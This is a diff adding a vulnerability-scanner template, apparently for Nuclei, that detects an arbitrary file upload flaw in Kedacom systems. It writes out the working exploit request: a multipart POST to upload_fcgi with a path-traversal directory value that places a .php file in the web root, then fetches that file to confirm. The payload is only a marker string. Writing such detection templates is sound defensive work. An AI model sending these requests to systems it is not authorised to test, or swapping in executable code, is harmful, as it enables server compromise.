@@ -1,0 +1,57 @@
+id: poc-yaml-keda-kedacom-anyfile-upload
+info:
+  name: Kedacom System Arbitrary File Upload
+  author: ProjectDiscoveryAI
+  severity: critical
+  tags: file-upload
+  description: |
+    This template detects arbitrary file upload vulnerability in Kedacom systems.
+
+variables:
+  filename: "{{to_lower(rand_base(10))}}"
+  t1: "{{rand_int(100, 1000)}}"
+
+flow: http(1) && http(2)
+
+http:
+  - id: upload-file
+    method: POST
+    path:
+      - "{{BaseURL}}/pmc-bin/upload_fcgi?uploadDir=../&uploadName={{filename}}.php"
+    headers:
+      Content-Type: "multipart/form-data; boundary=----WebKitFormBoundary"
+    body: |
+      ----WebKitFormBoundary
+      Content-Disposition: form-data; name="Filedata"; filename="{{filename}}.php"
+      Content-Type: application/octet-stream
+
+      This website has a vulnerability {{t1}}
+      ----WebKitFormBoundary--
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "<errorCode>"
+      - type: word
+        part: header
+        words:
+          - "text/xml"
+
+  - id: confirm-upload
+    method: POST
+    path:
+      - "{{BaseURL}}/{{filename}}.php"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "{{t1}}"
+          - "This website has a vulnerability"
